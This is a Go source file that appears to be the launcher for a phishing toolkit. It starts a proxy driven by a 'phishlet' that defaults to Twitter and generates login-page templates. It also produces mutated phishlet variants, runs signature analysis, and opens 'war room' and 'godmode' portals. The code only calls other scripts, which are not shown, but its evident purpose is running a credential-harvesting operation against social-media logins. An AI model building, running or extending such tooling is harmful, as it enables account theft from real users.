package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

func python() string {
	paths := []string{"python3", "python"}
	for _, p := range paths {
		_, err := exec.LookPath(p)
		if err == nil {
			return p
		}
	}
	return "python3"
}

func startAPI() *exec.Cmd {
	cmd := exec.Command(python(), "-m", "uvicorn", "api.rest_api:app", "--host", "0.0.0.0", "--port", "8000", "--reload")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Start()
	return cmd
}

func waitAPI(timeout time.Duration) bool {
	t0 := time.Now()
	for time.Since(t0) < timeout {
		resp, err := http.Get("http://127.0.0.1:8000/health")
		if err == nil && resp.StatusCode == 200 {
			return true
		}
		time.Sleep(500 * time.Millisecond)
	}
	return false
}

func startProxy(phishlet string) *exec.Cmd {
	env := os.Environ()
	env = append(env, "PHISHLET="+phishlet)
	cmd := exec.Command(python(), "engine/proxy.py")
	cmd.Env = env
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	_ = cmd.Start()
	return cmd
}

func openWarRoom() {
	path := filepath.Join("templates", "war_room.html")
	if runtime.GOOS == "darwin" {
		_ = exec.Command("open", path).Start()
	} else if runtime.GOOS == "windows" {
		_ = exec.Command("cmd", "/c", "start", path).Start()
	} else {
		_ = exec.Command("xdg-open", path).Start()
	}
}

func runTemplates(platform, ttype string) {
	_ = exec.Command(python(), "templates/cli.py", "generate", "--platform", platform, "--type", ttype, "--responsive").Run()
}

func runMutation(phishlet string) {
	_ = exec.Command(python(), "analysis/mutation/cli.py", "mutate", phishlet, "--variants", "3", "--output", "mutated_phishlets").Run()
}

func runAnalysis(path string) {
	_ = exec.Command(python(), "analysis/reverse_engineer/cli.py", "analyze", path, "--format", "json", "--output", "analysis.json").Run()
	_ = exec.Command(python(), "analysis/reverse_engineer/cli.py", "signatures", "analysis.json", "--type", "all", "--format", "json", "--output", "signatures.json").Run()
}

func runReport() {
	rp := "reporting.py"
	if _, err := os.Stat(rp); err == nil {
		_ = exec.Command(python(), rp).Run()
	}
}

func startPortal() {
	_ = exec.Command(python(), "godmode.py").Run()
}

func main() {
	headless := flag.Bool("headless", false, "Run without portal, only artifacts")
	phishlet := flag.String("phishlet", "phishlets/twitter.yaml", "Phishlet path")
	platform := flag.String("platform", "twitter", "Template platform")
	ttype := flag.String("type", "login", "Template type")
	flag.Parse()

	api := startAPI()
	_ = waitAPI(15 * time.Second)
	proxy := startProxy(*phishlet)
	openWarRoom()
	runTemplates(*platform, *ttype)
	runMutation(*phishlet)
	runAnalysis("mutated_phishlets")
	runReport()

	if *headless || os.Getenv("GODMODE_HEADLESS") == "1" {
		fmt.Println("Artifacts: analysis.json, signatures.json, mutated_phishlets/")
	} else {
		startPortal()
	}

	_ = api.Process.Kill()
	_ = proxy.Process.Kill()
}
